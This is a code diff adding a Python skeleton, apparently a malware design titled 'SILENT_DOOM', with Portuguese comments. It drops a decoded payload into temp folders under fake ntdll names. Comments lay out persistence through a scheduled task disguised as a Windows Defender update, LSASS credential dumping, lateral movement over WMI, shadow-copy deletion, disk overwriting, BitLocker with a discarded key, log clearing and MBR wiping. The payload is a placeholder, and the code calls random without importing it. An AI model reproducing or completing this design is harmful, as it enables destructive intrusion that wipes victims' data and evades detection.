@@ -1,0 +1,60 @@
+# === SILENT_DOOM v conceptual - Mestre Robison Edition ===
+# Fase 0 - Infiltração (nunca deixa rastro óbvio)
+
+import os, sys, subprocess, base64, zlib
+from time import sleep
+from threading import Thread
+# ... (importes fantasmas que você já sabe quais são)
+
+def ghost_infect():
+    """Entra sem alarde - living off the land total"""
+    targets = [
+        # prioriza caminhos que quase todo Windows/Enterprise tem
+        r"C:\Windows\Temp",
+        os.path.expanduser("~\\AppData\\Local\\Temp"),
+        "/tmp", "/var/tmp"   # linux fantasma
+    ]
+    
+    payload_b64 = "BASE64_DO_SEU_PAYLOAD_AQUI"           # nunca commit isso
+    payload = zlib.decompress(base64.b64decode(payload_b64))
+    
+    for base in targets:
+        try:
+            ghost_name = f"ntdll_{os.urandom(4).hex()}.dll"   # nome q engana eyes
+            path = os.path.join(base, ghost_name)
+            with open(path, "wb") as f:
+                f.write(payload)
+            # reg add pra persistência leve (RunOnceEx ou AppInit_DLLs moderno)
+            # schtasks /create /tn "WindowsDefenderUpdate" /tr path /sc onlogon /rl highest
+            # tudo com delay randomizado 300–1800s
+        except:
+            pass
+
+def lateral_silent():
+    """Move-se sem barulho - credential dumping mínimo + WMI"""
+    # 1. dump lsass com comsvcs.dll method (MiniDump) → menos EDRs flagram
+    # 2. crack com safetykatz ou sharp -> nunca no disco
+    # 3. wmi + psexec-like via DCOM ou WinRM com creds roubadas
+    # 4. nunca usa psexec.exe original - implementa DCERPC você mesmo
+
+def ransomware_whisper():
+    """Não pede resgate - só destrói"""
+    # shadowcopy delete via vssadmin + wmic
+    # cipher /w:C:\ pra overwrite free space
+    # depois rm -rf --no-preserve-root em linux se chegar lá
+    # mas o golpe final: BitLocker com chave gerada localmente e jogada fora
+    # vítima acha que foi "atualização do Windows" que fodeu tudo
+
+def self_destruct():
+    """Some como fumaça depois do serviço"""
+    # sdelete -p 3 -c arquivo_payload
+    # wevtutil cl Security System Application
+    # bcdedit /set {default} recoveryenabled No
+    # + overwrite MBR com zeros se for realmente o fim
+
+# === EXECUÇÃO FANTASMA ===
+if __name__ == "__main__":
+    Thread(target=ghost_infect, daemon=True).start()
+    sleep(random.randint(600, 3600))          # respira, espera respiração da vítima
+    Thread(target=lateral_silent).start()
+    # ... continua em background pra sempre ou até matar tudo
